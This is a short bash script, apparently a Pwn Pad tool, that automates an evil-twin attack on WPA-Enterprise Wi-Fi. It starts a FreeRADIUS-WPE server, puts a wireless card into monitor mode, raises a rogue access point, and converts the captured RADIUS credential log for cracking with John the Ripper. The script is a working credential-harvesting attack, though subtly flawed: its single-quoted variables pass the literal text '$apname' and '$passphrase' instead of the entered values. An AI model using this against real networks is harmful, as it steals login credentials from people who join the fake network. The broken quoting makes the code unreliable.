#!/bin/bash
#####################################
cd /opt/pwnpad/freeradius/
echo "Starting Free Radius Server"
radiusd
sleep 3
echo "Staring monitor on wlan1"
airmon-ng start wlan1
echo "Creating AP with hostapd"
read -p "Enter AP name:" apname
read -p "Enter passphrase:" passphrase
create_ap wlan1 wlan0 '$apname' '$passphrase'
echo "Running John the Ripper against Freeradius server log"
./RadiusWPE2John.py /usr/local/var/log/radius/freeradius-server-wpe.log